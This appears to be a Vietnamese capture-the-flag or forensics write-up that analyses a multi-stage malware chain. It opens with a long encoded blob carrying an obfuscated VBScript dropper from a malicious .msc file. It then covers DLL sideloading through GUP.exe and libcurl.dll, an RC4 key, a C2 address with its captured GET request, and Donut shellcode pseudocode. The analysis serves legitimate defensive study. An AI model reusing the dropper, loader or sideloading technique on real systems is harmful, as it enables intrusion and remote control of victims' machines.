aUEh4dHo0JTNEUlRjeEZteS5zZWxlY3ROb2RlcyUyOCUyMENociUyODQ3JTI5JTI2Q2hyJTI4JTI2SDRkJTI5JTI2Q2hyJTI4NzclMjklMjYlMjJDJTIyJTI2Q2hyJTI4OTUlMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINDMlMjIlMjklMjklMjYlMjJvJTIyJTI2Q2hyJTI4SW50JTI4JTIyMTEwJTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDczJTI5JTI2Q2hyJTI4SW50JTI4JTIyMTExJTIyJTI5JTI5JTI2JTIybCUyMiUyNkNociUyOCUyNkg2NSUyOSUyNkNociUyOEludCUyOCUyMiUyNkg0NiUyMiUyOSUyOSUyNiUyMmklMjIlMjZDaHIlMjg1MDk0LTQ5ODYlMjklMjZDaHIlMjgxMDElMjklMjZDaHIlMjhJbnQlMjglMjI0NyUyMiUyOSUyOSUyNkNociUyODMzMS0yNjUlMjklMjZDaHIlMjgxMDUlMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINmUlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINjElMjIlMjklMjklMjZDaHIlMjglMjZINzIlMjklMjZDaHIlMjhJbnQlMjglMjIxMjElMjIlMjklMjklMjZDaHIlMjglMjZINTMlMjklMjZDaHIlMjgxMTYlMjklMjYlMjJvJTIyJTI2JTIyciUyMiUyNkNociUyOC0xMDg4JTJCMTE4NSUyOSUyNkNociUyODIxNTItMjA0OSUyOSUyNkNociUyODI2Njk0My8yNjQzJTI5JTI2Q2hyJTI4SW50JTI4JTIyNDclMjIlMjklMjklMjZDaHIlMjgtMzg1JTJCNDUxJTI5JTI2Q2hyJTI4MTA1JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDZlJTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDYxJTIyJTI5JTI5JTI2Q2hyJTI4MTE0JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDc5JTIyJTI5JTI5JTI2Q2hyJTI4OTElMjklMjYlMjIlNDAlMjIlMjZDaHIlMjhJbnQlMjglMjI3OCUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjk3JTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDZkJTI5JTI2Q2hyJTI4JTI2SDY1JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDNkJTIyJTI5JTI5JTI2Q2hyJTI4Mzg3Ny0zODM4JTI5JTI2Q2hyJTI4SW50JTI4JTIyNjclMjIlMjklMjklMjZDaHIlMjglMjZINGYlMjklMjZDaHIlMjg3OCUyOSUyNkNociUyODgzJTI5JTI2Q2hyJTI4NzklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINGMlMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjI2OSUyMiUyOSUyOSUyNkNociUyODQxOS0zMjQlMjklMjYlMjJNJTIyJTI2Q2hyJTI4SW50JTI4JTIyJTI2SDQ1JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyNzglMjIlMjklMjklMjYlMjJVJTIyJTI2Q2hyJTI4SW50JTI4JTIyMzklMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINWQlMjIlMjklMjklMjAlMjklMjAlMEFaZTFDJTNEYVpQSHh0ejQlMjgwJTI5LnRleHQlMEFTZXQlMjBhWlBIeHR6NCUyMCUzRCUyMFJUY3hGbXkuc2VsZWN0Tm9kZXMlMjglMjBDaHIlMjglMjZIMmYlMjklMjZDaHIlMjgtMTUzNiUyQjE2MTMlMjklMjZDaHIlMjg0OTI4LzY0JTI5JTI2Q2hyJTI4NjclMjklMjZDaHIlMjgzNDUtMjUwJTI5JTI2Q2hyJTI4SW50JTI4JTIyNjclMjIlMjklMjklMjZDaHIlMjgxMTElMjklMjYlMjJuJTIyJTI2Q2hyJTI4JTI2SDczJTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDZmJTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDZjJTI5JTI2Q2hyJTI4SW50JTI4JTIyMTAxJTIyJTI5JTI5JTI2Q2hyJTI4MTQ1MTEwLzIwNzMlMjklMjZDaHIlMjglMjZINjklMjklMjZDaHIlMjgxMDglMjklMjZDaHIlMjhJbnQlMjglMjIxMDElMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjIlMjZIMmYlMjIlMjklMjklMjZDaHIlMjg2NiUyOSUyNkNociUyOCUyNkg2OSUyOSUyNkNociUyODE1MTQtMTQwNCUyOSUyNkNociUyOEludCUyOCUyMjk3JTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDcyJTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyMTIxJTIyJTI5JTI5JTI2Q2hyJTI4ODMlMjklMjZDaHIlMjgyMTI3NDQvMTgzNCUyOSUyNkNociUyOCUyNkg2ZiUyOSUyNkNociUyOEludCUyOCUyMjExNCUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjk3JTIyJTI5JTI5JTI2Q2hyJTI4JTI2SDY3JTI5JTI2Q2hyJTI4LTc0OSUyQjg1MCUyOSUyNkNociUyOC0zMDE1JTJCMzA2MiUyOSUyNkNociUyOEludCUyOCUyMiUyNkg0MiUyMiUyOSUyOSUyNiUyMmklMjIlMjZDaHIlMjglMjZINmUlMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINjElMjIlMjklMjklMjZDaHIlMjgxMTQlMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINzklMjIlMjklMjklMjZDaHIlMjhJbnQlMjglMjI5MSUyMiUyOSUyOSUyNkNociUyOCUyNkg0MCUyOSUyNkNociUyOEludCUyOCUyMiUyNkg0ZSUyMiUyOSUyOSUyNkNociUyOCUyNkg2MSUyOSUyNkNociUyODEwOSUyOSUyNkNociUyODEwMSUyOSUyNkNociUyOCUyNkgzZCUyOSUyNkNociUyOC01NDglMkI1ODclMjklMjZDaHIlMjg2NyUyOSUyNkNociUyOEludCUyOCUyMiUyNkg0ZiUyMiUyOSUyOSUyNkNociUyODMzNzktMzMwMSUyOSUyNiUyMlMlMjIlMjYlMjJPJTIyJTI2Q2hyJTI4LTExNDUlMkIxMjIxJTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDQ1JTIyJTI5JTI5JTI2JTIyXyUyMiUyNkNociUyOC02MjYlMkI3MDYlMjklMjZDaHIlMjhJbnQlMjglMjI2NSUyMiUyOSUyOSUyNkNociUyODc4JTI5JTI2JTIyRSUyMiUyNkNociUyODM5JTI5JTI2Q2hyJTI4SW50JTI4JTIyOTMlMjIlMjklMjklMjAlMjklMjAlMEFKb3pNaDlqZyUzRGFaUEh4dHo0JTI4MCUyOS50ZXh0JTBBQW5aVU9kcUZ1TUV3JTNEWGs3ZmJwOHYlMjhaZTFDJTI5JTBBczRmcjJ5NFE3bHZRJTNEWGs3ZmJwOHYlMjhKb3pNaDlqZyUyOSUwQURpbSUyMGNIaDV3QVJVZXh0JTBBU2V0JTIwY0hoNXdBUlVleHQlM0RDcmVhdGVPYmplY3QlMjhDaHIlMjg2NSUyOSUyNkNociUyOCUyNkg0NCUyOSUyNkNociUyOEludCUyOCUyMiUyNkg0ZiUyMiUyOSUyOSUyNkNociUyODY4JTI5JTI2Q2hyJTI4NDU3NC00NTA4JTI5JTI2Q2hyJTI4NDYlMjklMjYlMjJTJTIyJTI2Q2hyJTI4SW50JTI4JTIyJTI2SDc0JTIyJTI5JTI5JTI2Q2hyJTI4Njk2MC02ODQ2JTI5JTI2Q2hyJTI4SW50JTI4JTIyMTAxJTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyJTI2SDYxJTIyJTI5JTI5JTI2Q2hyJTI4SW50JTI4JTIyMTA5JTIyJTI5JTI5JTI5JTBBY0hoNXdBUlVleHQuVHlwZSUzRDElMEFjSGg1d0FSVWV4dC5PcGVuJTIwJTBBY0hoNXdBUlVleHQuV3JpdGUlMjBBblpVT2RxRnVNRXclMEFjSGg1d0FSVWV4dC5TYXZlVG9GaWxlJTIwZ3dxaGhWJTJDMiUwQURpbSUyMEJLekcxbGRSdzclMEFTZXQlMjBCS3pHMWxkUnc3JTNEQ3JlYXRlT2JqZWN0JTI4Q2hyJTI4NjUlMjklMjZDaHIlMjglMjZINDQlMjklMjZDaHIlMjhJbnQlMjglMjIlMjZINGYlMjIlMjklMjklMjZDaHIlMjg2OCUyOSUyNkNociUyODQ1NzQtNDUwOCUyOSUyNkNociUyODQ2JTI5JTI2JTIyUyUyMiUyNkNociUyOEludCUyOCUyMiUyNkg3NCUyMiUyOSUyOSUyNkNociUyODY5NjAtNjg0NiUyOSUyNkNociUyOEludCUyOCUyMjEwMSUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMiUyNkg2MSUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMjEwOSUyMiUyOSUyOSUyOSUwQUJLekcxbGRSdzcuVHlwZSUzRDElMEFCS3pHMWxkUnc3Lk9wZW4lMjAlMEFCS3pHMWxkUnc3LldyaXRlJTIwczRmcjJ5NFE3bHZRJTBBQkt6RzFsZFJ3Ny5TYXZlVG9GaWxlJTIwSkpOZSUyQzIlMEFBZ1V2Y0N1SHp6YmwucnVuJTIwJTIyJTIyJTIyJTIyJTIwJTI2JTIwZ3dxaGhWJTIwJTI2JTIwJTIyJTIyJTIyJTIyJTIwJTI2JTIwQ2hyJTI4SW50JTI4JTIyMzIlMjIlMjklMjklMjZDaHIlMjglMjZINzQlMjklMjZDaHIlMjglMjZIMjAlMjklMjZDaHIlMjglMjZIMzglMjklMjYlMjIuJTIyJTI2Q2hyJTI4NTYlMjklMjZDaHIlMjhJbnQlMjglMjI0NiUyMiUyOSUyOSUyNkNociUyOEludCUyOCUyMiUyNkgzOCUyMiUyOSUyOSUyNiUyMi4lMjIlMjZDaHIlMjgtMTI5JTJCMTg1JTI5JTJDMCUyQ2ZhbHNlJTBBRW5kJTIwRnVuY3Rpb24lMEFQdWJsaWMlMjBGdW5jdGlvbiUyMGk5VnUwJTI4QnlWYWwlMjBWYWx1ZSUyQ0J5VmFsJTIwU2hpZnQlMjklMEFpOVZ1MCUzRFZhbHVlJTBBSWYlMjBTaGlmdCUzRTAlMjBUaGVuJTBBSWYlMjBWYWx1ZSUzRTAlMjBUaGVuJTBBaTlWdTAlM0RJbnQlMjhpOVZ1MC8lMjgyJTVFU2hpZnQlMjklMjklMEFFbHNlJTBBSWYlMjBTaGlmdCUzRTMxJTIwVGhlbiUwQWk5VnUwJTNEMCUwQUVsc2UlMEFpOVZ1MCUzRGk5VnUwJTIwQW5kJTIwJTI2SDdGRkZGRkZGJTBBaTlWdTAlM0RJbnQlMjhpOVZ1MC8lMjgyJTVFU2hpZnQlMjklMjklMEFpOVZ1MCUzRGk5VnUwJTIwT3IlMjAyJTVFJTI4MzEtU2hpZnQlMjklMEFFbmQlMjBJZiUwQUVuZCUyMElmJTBBRW5kJTIwSWYlMEFFbmQlMjBGdW5jdGlvbiUwQVB1YmxpYyUyMEZ1bmN0aW9uJTIwUEl2d280UURqQkMlMjhCeVZhbCUyMFZhbHVlJTJDQnlWYWwlMjBTaGlmdCUyOSUwQVBJdndvNFFEakJDJTNEVmFsdWUlMEFJZiUyMFNoaWZ0JTNFMCUyMFRoZW4lMEFEaW0lMjBpJTIwJTBBRGltJTIwbSUyMCUwQUZvciUyMGklM0QxJTIwVG8lMjBTaGlmdCUwQW0lM0RQSXZ3bzRRRGpCQyUyMEFuZCUyMCUyNkg0MDAwMDAwMCUwQVBJdndvNFFEakJDJTNEJTI4UEl2d280UURqQkMlMjBBbmQlMjAlMjZIM0ZGRkZGRkYlMjklMkEyJTBBSWYlMjBtJTNDJTNFMCUyMFRoZW4lMEFQSXZ3bzRRRGpCQyUzRFBJdndvNFFEakJDJTIwT3IlMjAlMjZIODAwMDAwMDAlMEFFbmQlMjBJZiUwQU5leHQlMEFFbmQlMjBJZiUwQUVuZCUyMEZ1bmN0aW9uJTBBUHVibGljJTIwRnVuY3Rpb24lMjBlVUJwMUxvTFlFTXklMjhCeVZhbCUyMG51bSUyOSUwQUNvbnN0JTIwcmtMeCUzRDU1NzA2NDUlMEFDb25zdCUyMGJld2VUMlUlM0Q1MjQyOCUwQUNvbnN0JTIwZDElM0Q3JTBBQ29uc3QlMjBkMiUzRDE0JTBBRGltJTIwdCUyQ3UlMkNvdXQlMjAlMEF0JTNEJTI4bnVtJTIwWG9yJTIwaTlWdTAlMjhudW0lMkNkMiUyOSUyOSUyMEFuZCUyMGJld2VUMlUlMEF1JTNEbnVtJTIwWG9yJTIwdCUyMFhvciUyMFBJdndvNFFEakJDJTI4dCUyQ2QyJTI5JTBBdCUzRCUyOHUlMjBYb3IlMjBpOVZ1MCUyOHUlMkNkMSUyOSUyOSUyMEFuZCUyMHJrTHglMEFvdXQlM0QlMjh1JTIwWG9yJTIwdCUyMFhvciUyMFBJdndvNFFEakJDJTI4dCUyQ2QxJTI5JTI5JTBBZVVCcDFMb0xZRU15JTNEb3V0JTBBRW5kJTIwRnVuY3Rpb24lMEFQdWJsaWMlMjBGdW5jdGlvbiUyMEZUS2FXdmNZYUdXdCUyOEJ5UmVmJTIwTWlDemk5JTI4JTI5JTI5JTBBRGltJTIwaSUyQ2ZyJTJDdXBKTk5hJTJDcmF3JTIwJTBBRGltJTIwYSUyQ2IlMkNjJTJDZCUyMCUwQURpbSUyMFlCeDRQWkxUSFNRMSUyMCUwQURpbSUyMEVKU2k4cUpkMCUyOCUyOSUyMCUwQURpbSUyMGEyJTJDYjIlMjAlMEFZQng0UFpMVEhTUTElM0QlMjIlMjIlMEFGb3IlMjBpJTNEMCUyMFRvJTIwJTI4VUJvdW5kJTI4TWlDemk5JTI5LzQlMkIxJTI5JTBBZnIlM0RpJTJBNCUwQUlmJTIwZnIlM0VVQm91bmQlMjhNaUN6aTklMjklMjBUaGVuJTBBRXhpdCUyMEZvciUwQUVuZCUyMElmJTBBdXBKTk5hJTNEMCUwQXVwSk5OYSUzRHVwSk5OYSUyME9yJTIwUEl2d280UURqQkMlMjhNaUN6aTklMjhmciUyQjMlMjklMkMyNCUyOSUwQXVwSk5OYSUzRHVwSk5OYSUyME9yJTIwUEl2d280UURqQkMlMjhNaUN6aTklMjhmciUyQjIlMjklMkMxNiUyOSUwQXVwSk5OYSUzRHVwSk5OYSUyME9yJTIwUEl2d280UURqQkMlMjhNaUN6aTklMjhmciUyQjElMjklMkM4JTI5JTBBdXBKTk5hJTNEdXBKTk5hJTIwT3IlMjBNaUN6aTklMjhmciUyQjAlMjklMEFyYXclM0RlVUJwMUxvTFlFTXklMjh1cEpOTmElMjklMEFhJTNEQ2hyJTI4aTlWdTAlMjglMjhyYXclMjBBbmQlMjAlMjZIRkYwMDAwMDAlMjklMkMyNCUyOSUyOSUwQWIlM0RDaHIlMjhpOVZ1MCUyOCUyOHJhdyUyMEFuZCUyMDE2NzExNjgwJTI5JTJDMTYlMjklMjklMEFjJTNEQ2hyJTI4aTlWdTAlMjglMjhyYXclMjBBbmQlMjA2NTI4MCUyOSUyQzglMjklMjklMEFkJTNEQ2hyJTI4aTlWdTAlMjglMjhyYXclMjBBbmQlMjAyNTUlMjklMkMwJTI5JTI5JTBBWUJ4NFBaTFRIU1ExJTNEWUJ4NFBaTFRIU1ExJTJCZCUyQmMlMkJiJTJCYSUwQU5leHQlMEFGVEthV3ZjWWFHV3QlM0RZQng0UFpMVEhTUTElMEFFbmQlMjBGdW5jdGlvbiUwQVB1YmxpYyUyMEZ1bmN0aW9uJTIwdDR6Rnh4Z2cyMiUyOE1pQ3ppOSUyOSUwQURpbSUyMENZaFY4TiUyOCUyOSUyQ0xpZWZzJTI4JTI5JTJDYXJyYXlCeXRlMyUyODI1NSUyOSUwQURpbSUyMFJwN2phWTJqT3FyJTI4NjMlMjklMkNhcnJheUxvbmc1JTI4NjMlMjklMjAlMEFEaW0lMjBNYnQwbXprNiUyODYzJTI5JTJDTkFMUXAwR3UzJTBBRGltJTIwYjdaOW44JTJDaXRlciUyQ1ZLa1pFZiUyQ1p5dktMTHl5SEhEJTBBRGltJTIwWUJ4NFBaTFRIU1ExJTIwJTBBTWlDemk5JTNEUmVwbGFjZSUyOE1pQ3ppOSUyQ3ZiQ3IlMkN2Yk51bGxTdHJpbmclMjklMEFNaUN6aTklM0RSZXBsYWNlJTI4TWlDemk5JTJDdmJMZiUyQ3ZiTnVsbFN0cmluZyUyOSUwQVp5dktMTHl5SEhEJTNETGVuJTI4TWlDemk5JTI5JTIwTW9kJTIwNCUwQUlmJTIwSW5TdHJSZXYlMjhNaUN6aTklMkMlMjIlM0QlM0QlMjIlMjklMjBUaGVuJTBBYjdaOW44JTNEMiUwQUVsc2VJZiUyMEluU3RyUmV2JTI4TWlDemk5JTJDJTIyJTIyJTJCJTIyJTNEJTIyJTI5JTIwVGhlbiUwQWI3WjluOCUzRDElMEFFbmQlMjBJZiUwQUZvciUyMFp5dktMTHl5SEhEJTNEMCUyMFRvJTIwMjU1JTBBU2VsZWN0JTIwQ2FzZSUyMFp5dktMTHl5SEhEJTBBQ2FzZSUyMDY1JTJDNjYlMkM2NyUyQzY4JTJDNjklMkM3MCUyQzcxJTJDNzIlMkM3MyUyQzc0JTJDNzUlMkM3NiUyQzc3JTJDNzglMkM3OSUyQzgwJTJDODElMkM4MiUyQzgzJTJDODQlMkM4NSUyQzg2JTJDODclMkM4OCUyQzg5JTJDOTAlMEFhcnJheUJ5dGUzJTI4Wnl2S0xMeXlISEQlMjklM0RaeXZLTEx5eUhIRC02NSUwQUNhc2UlMjA5NyUyQzk4JTJDOTklMkMxMDAlMkMxMDElMkMxMDIlMkMxMDMlMkMxMDQlMkMxMDUlMkMxMDYlMkMxMDclMkMxMDglMkMxMDklMkMxMTAlMkMxMTElMkMxMTIlMkMxMTMlMkMxMTQlMkMxMTUlMkMxMTYlMkMxMTclMkMxMTglMkMxMTklMkMxMjAlMkMxMjElMkMxMjIlMEFhcnJheUJ5dGUzJTI4Wnl2S0xMeXlISEQlMjklM0RaeXZLTEx5eUhIRC03MSUwQUNhc2UlMjA0OCUyQzQ5JTJDNTAlMkM1MSUyQzUyJTJDNTMlMkM1NCUyQzU1JTJDNTYlMkM1NyUwQWFycmF5Qnl0ZTMlMjhaeXZLTEx5eUhIRCUyOSUzRFp5dktMTHl5SEhEJTJCNCUwQUNhc2UlMjA0MyUwQWFycmF5Qnl0ZTMlMjhaeXZLTEx5eUhIRCUyOSUzRDYyJTBBQ2FzZSUyMDQ3JTBBYXJyYXlCeXRlMyUyOFp5dktMTHl5SEhEJTI5JTNENjMlMEFDYXNlJTIwRWxzZSUwQUVuZCUyMFNlbGVjdCUwQU5leHQlMEFGb3IlMjBaeXZLTEx5eUhIRCUzRDAlMjBUbyUyMDYzJTBBUnA3amFZMmpPcXIlMjhaeXZLTEx5eUhIRCUyOSUzRFp5dktMTHl5SEhEJTJBNjQlMEFhcnJheUxvbmc1JTI4Wnl2S0xMeXlISEQlMjklM0RaeXZLTEx5eUhIRCUyQTQwOTYlMEFNYnQwbXprNiUyOFp5dktMTHl5SEhEJTI5JTNEWnl2S0xMeXlISEQlMkEyNjIxNDQlMEFOZXh0JTBBTGllZnMlM0RTdHJDb252JTI4TWlDemk5JTJDdmJGcm9tVW5pY29kZSUyOSUwQVJlRGltJTIwQ1loVjhOJTI4JTI4JTI4JTI4VUJvdW5kJTI4TGllZnMlMjklMkIxJTI5JTVDNCUyOSUyQTMlMjktMSUyOSUwQUZvciUyMGl0ZXIlM0QwJTIwVG8lMjBVQm91bmQlMjhMaWVmcyUyOSUyMFN0ZXAlMjA0JTBBTkFMUXAwR3UzJTNETWJ0MG16azYlMjhhcnJheUJ5dGUzJTI4TGllZnMlMjhpdGVyJTI5JTI5JTI5JTJCYXJyYXlMb25nNSUyOGFycmF5Qnl0ZTMlMjhMaWVmcyUyOGl0ZXIlMkIxJTI5JTI5JTI5JTJCUnA3amFZMmpPcXIlMjhhcnJheUJ5dGUzJTI4TGllZnMlMjhpdGVyJTJCMiUyOSUyOSUyOSUyQmFycmF5Qnl0ZTMlMjhMaWVmcyUyOGl0ZXIlMkIzJTI5JTI5JTBBWnl2S0xMeXlISEQlM0ROQUxRcDBHdTMlMjBBbmQlMjAxNjcxMTY4MCUwQUNZaFY4TiUyOFZLa1pFZiUyOSUzRFp5dktMTHl5SEhEJTVDNjU1MzYlMEFaeXZLTEx5eUhIRCUzRE5BTFFwMEd1MyUyMEFuZCUyMDY1MjgwJTBBQ1loVjhOJTI4VktrWkVmJTJCMSUyOSUzRFp5dktMTHl5SEhEJTVDMjU2JTBBQ1loVjhOJTI4VktrWkVmJTJCMiUyOSUzRE5BTFFwMEd1MyUyMEFuZCUyMDI1NSUwQVZLa1pFZiUzRFZLa1pFZiUyQjMlMEFOZXh0JTBBWUJ4NFBaTFRIU1ExJTNEU3RyQ29udiUyOENZaFY4TiUyQ3ZiVW5pY29kZSUyOSUwQUlmJTIwYjdaOW44JTIwVGhlbiUyMFlCeDRQWkxUSFNRMSUzRExlZnQlMjhZQng0UFpMVEhTUTElMkNMZW4lMjhZQng0UFpMVEhTUTElMjktYjdaOW44JTI5JTBBdDR6Rnh4Z2cyMiUzREZUS2FXdmNZYUdXdCUyOFN0ckNvbnYlMjhZQng0UFpMVEhTUTElMkN2YkZyb21Vbmljb2RlJTI5JTI5JTBBdDR6Rnh4Z2cyMiUzRHFZN0FPRXBVMXduJTI4dDR6Rnh4Z2cyMiUyQyUyMn4lMjIlMjklMEFFbmQlMjBGdW5jdGlvbiUwQUZ1bmN0aW9uJTIwcVk3QU9FcFUxd24lMjhzdHIlMkNjaGFycyUyOSUwQURpbSUyMGZxWDNkYnVkbVUlMEFEaW0lMjBYVlpFQ0tieCUyOCUyOSUwQVhWWkVDS2J4JTNEU3BsaXQlMjhzdHIlMkNjaGFycyUyOSUwQWZxWDNkYnVkbVUlM0RVQm91bmQlMjhYVlpFQ0tieCUyQzElMjklMEFJZiUyMGZxWDNkYnVkbVUlM0MlM0UwJTIwVGhlbiUwQXN0ciUzRExlZnQlMjhzdHIlMkNMZW4lMjhzdHIlMjktZnFYM2RidWRtVSUyOSUwQUVuZCUyMElmJTBBcVk3QU9FcFUxd24lM0RzdHIlMEFFbmQlMjBGdW5jdGlvbiUwQSU1RCU1RCUzRSUzQy9tcyUzQXNjcmlwdCUzRSUwQSUzQy9zdHlsZXNoZWV0JTNFIi5yZXBsYWNlKCJfTVNDIix2KSkpO1hNTC50cmFuc2Zvcm1Ob2RlKHhzbCk&ieol=CRLF) thấy được đây là một file VBScript

>VBScript

## Task 6

**Where does the attacker store the second part of the payload?**

**Where does the attacker store the black DLL in the second part of the payload?**

VBScript mà ta vừa decode được vẫn còn bị obfuscated cho nên bây giờ ta sẽ thực hiện deobf

Sau khi có script hoàn chỉnh thì ta biết được file `GUP.exe` được lưu trong `/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_MENU']` và file `libcurl.dll` trong `/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_PANE']`

Để lấy 2 file này ra có thể lướt xuống cuối file `.msc` lúc đầu và lấy từ 2 phần `CONSOLE_MENU` và `CONSOLE_PANE` ra

>/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_MENU']

>/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_PANE']

## Task 7

**What is the MITRE ATT&CK ID for the signed EXE used by the attacker to load the mal DLL?**

Câu hỏi này và 2 câu hỏi của task 6 thì cũng khá là khớp với mô tả của kỹ thuật `DLL Sideloading`

Hơn nữa, khi phân tích file `exe` thì cũng thấy nó có import một vài hàm từ `libcurl.dll`

## Task 8

**Which function of the original DLL does the mal DLL used by the attacker hijack?**

Tất cả hàm `GUP.exe` import từ `libcurl.dll`

```text
curl_easy_cleanup 
curl_easy_perform 
curl_easy_setopt 
curl_easy_init
```
3 hàm đầu khi kiểm tra pseudocode trong IDA thì khá nhỏ và không có gì đáng nghi

`curl_easy_init` có gọi một hàm khác thực hiện `VirtualAlloc`, `EnumFontsW` khá lạ

>curl_easy_init

## Task 9

**What is the algorithm used by the mal DLL used by the attacker to decrypt the next stage payload?**

**What is the key used by the mal DLL used by the attacker to decrypt the next stage payload?**

`curl_easy_init` sử dụng RC4 

```text
  v41 = 0x8B9D1AF2;
  v42 = 0x5D1E;
  v43 = 0;
```

Cuối cùng `memcpy` để copy payload và `EnumFontsW` để chạy. Ta đặt breakpoint ngay sau khi vừa gọi `memcpy` để dump payload đó ra

> RC4

> f21a9d8b1e5d00

## Task 10

**What is the C2 connection back to the next stage payload used by the attacker?**

Payload tiếp theo là một file `exe` 

```c
  v8 = (void (*)(void))sub_4013E0(v7);
  if ( VirtualProtect(v8, dwSize, 0x40u, &flOldProtect) )
    v8();
```

Đưa vào IDA ở cuối hàm main gọi `sub_4013E0` để làm gì đó với `v7` sau đó đưa vào `v8` rồi gọi `VirtualProtect` để điều chỉnh lại quyền của vùng nhớ `v8` sau đó chạy

Khi ấn vào hàm `sub_4013E0` để kiểm tra thì thấy thực ra nó cần có 3 tham số

```c
int __fastcall sub_4013E0(const WCHAR *a1, INTERNET_PORT a2, const WCHAR *a3)
/*....*/
WinHttpConnect(v5, a1, a2, 0)
/*....*/
WinHttpOpenRequest(v4, L"GET", a3, 0, 0, 0, v8);
```

Qua đây ta có thể hiểu được chương trình này muốn thực hiện một `GET request` đến server có ip `a1`, port `a2` và file `a3`. Vậy ta chỉ cần đặt breakpoint tại hàm `sub_4013E0` khi debug và xem các tham số của nó

`192.168.57.119:6000/files/1730391917.bin`

> 192.168.57.119:6000

## Task 11, 12, 13

**What encryption algorithm is used by the attacker to send the final stage payload?**

**What is the MD5 of the key used by the attacker in the final stage payload(RAT)?**

**What family of C2 did the attacker use?**

Biết payload tiếp theo được truyền qua mạng cho nên ta sẽ đi vào file pcap để kiểm tra, filter theo địa chỉ `192.168.57.119:6000` thì thấy được trong tcp stream đầu tiên chính là lúc mà mã độc gửi request đến server. Ta xuất payload ra

```pcap
GET /files/1730391917.bin HTTP/1.1
Connection: Keep-Alive
User-Agent: orca/1.0
Host: 192.168.57.119:6000


HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 21625377
Content-Type: application/octet-stream
Last-Modified: Thu, 31 Oct 2024 16:25:22 GMT
Date: Fri, 01 Nov 2024 00:33:41 GMT

/*...payload...*/
```

Payload này không có header file pe hay gì cả, đưa vào trong IDA thì thấy vẫn nhận diện được khá nhiều hàm nên tôi đoán đây là một shellcode

>Khi up lên [Virustotal](https://www.virustotal.com/gui/file/2e407090e0dd0ff94fbd97b435b2ac280d2f3e26b6c61c373d6be207ff857eb2) thì biết được shellcode này được tạo bởi `donut`, với shellcode donut ta có thể dùng [donut-decryptor](https://github.com/volexity/donut-decryptor) để đưa về lại file `exe` gốc nhưng khi làm tôi không biết nên phải debug shellcode khá lâu nhưng cuối cùng vẫn ra đáp án 

Có thể dùng `sclauncher` để đưa shellcode thành file `exe` debug cho tiện. Phải đưa về file 32bit bởi vì các file `exe` trong bài này đều là 32bit, payload này cũng có check cấu trúc của file thì mới thực hiện tiếp

```text
`sclauncher64.exe -f="shellcode.bin" -pe -32 -o="stage4_32.exe"`
```

Thực hiện static trong IDA trước

```c
// positive sp value has been detected, the output may be wrong!
int __usercall sub_189BB85@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<edi>, int a4@<esi>)
{
  int v4; // ecx
  int v5; // edx
  _DWORD *v6; // esi
  int v7; // edi
  int (__cdecl *v8)(_DWORD, _DWORD, int); // edi
  int v9; // eax
  void (__cdecl *v10)(int *, _DWORD); // ebp
  void (__cdecl *v11)(int); // ebx
  int (__cdecl *v12)(int *); // eax
  int v13; // eax
  int v14; // eax
  int v16; // [esp+1ECh] [ebp-2F4h] BYREF
  int v17; // [esp+1F4h] [ebp-2ECh] BYREF
  int v18; // [esp+1FCh] [ebp-2E4h]
  int v19; // [esp+200h] [ebp-2E0h]
  int v20; // [esp+204h] [ebp-2DCh]
  int v21; // [esp+208h] [ebp-2D8h]
  int v22; // [esp+2A4h] [ebp-23Ch]
  int v23; // [esp+2B0h] [ebp-230h]
  int v24; // [esp+4D8h] [ebp-8h]
  int v25; // [esp+4DCh] [ebp-4h]

  v4 = v24;
  v5 = v25;
  v25 = v24;
  v24 = v5;
  v21 = a1;
  v20 = a2;
  v19 = a4;
  v6 = (_DWORD *)v4;
  v18 = a3;
  v7 = 0;
  if ( *(_QWORD *)(v4 + 568) )
  {
    v8 = (int (__cdecl *)(_DWORD, _DWORD, int))fn_resolve_api(
                                                 v4,
                                                 *(_DWORD *)(v4 + 136),
                                                 *(_DWORD *)(v4 + 140),
                                                 *(_DWORD *)(v4 + 40),
                                                 *(_DWORD *)(v4 + 44));
    if ( !v8 )
      return -1;
    v9 = ((int (__cdecl *)(_DWORD *, _DWORD, _DWORD, int, int, int, int))sub_18A053B)(v6, 0, 0, v18, v19, v20, v21);
    v7 = v8(0, 0, (char *)dword_402120 - ((char *)&loc_403074 + 1) + v9);
    v10 = (void (__cdecl *)(int *, _DWORD))fn_resolve_api(v6, v6[110], v6[111], v6[10], v6[11]);
    v11 = (void (__cdecl *)(int))fn_resolve_api(v6, v6[36], v6[37], v6[10], v6[11]);
    v12 = (int (__cdecl *)(int *))fn_resolve_api(v6, v6[38], v6[39], v6[10], v6[11]);
    if ( v10 && v11 )
    {
      if ( v12 )
      {
        v17 = 65543;
        v13 = v12(&v17);
        v11(v13);
        v14 = v6[142];
        v23 &= 0xFFFFFFFC;
        v22 = v14;
        v10(&v16, 0);
      }
    }
  }
  else
  {
    main_exec((int *)v4);
  }
